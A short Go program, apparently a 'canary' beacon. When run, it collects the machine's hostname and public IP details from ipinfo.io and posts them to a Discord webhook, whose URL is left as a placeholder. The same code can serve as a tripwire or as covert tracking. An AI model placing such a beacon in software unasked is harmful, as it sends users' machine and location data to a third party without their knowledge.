package main

import(
    "os"
    "log"
    "fmt"
    "io"
    "net/http"
    "github.com/theenawman/goDiscordCanary/pkg/webhook"
)

func host() string {
    hostname, err := os.Hostname()
    if err != nil {
        fmt.Println(err)
        os.Exit(1)
    }
    return hostname
}

func GetIP() string { // Get preferred outbound ip of this machine
    req, err := http.Get("https://ipinfo.io")
    if err != nil {
        log.Fatal(err)
    }
    content, err := io.ReadAll(req.Body)
    req.Body.Close()
    if err != nil {
        log.Fatal(err)
    }
    return string(content)
}

func main() {
    var username = host()
    var content = GetIP()
    var url = "https://discord.com/api/webhooks/<<CHANGE ME>>"
    var image_url = "https://rshell.nyc3.cdn.digitaloceanspaces.com/cosmo.png"

    image := webhook.Image{
        Url: &image_url,
    }

    embed := webhook.Embed{
        Image: &image,
    }

    message := webhook.Message{
        Username: &username,
        AvatarUrl: &image_url,
        Content:  &content,
    }

    err := webhook.SendMessage(url, message)
    if err != nil {
        log.Fatal(err)
    }
}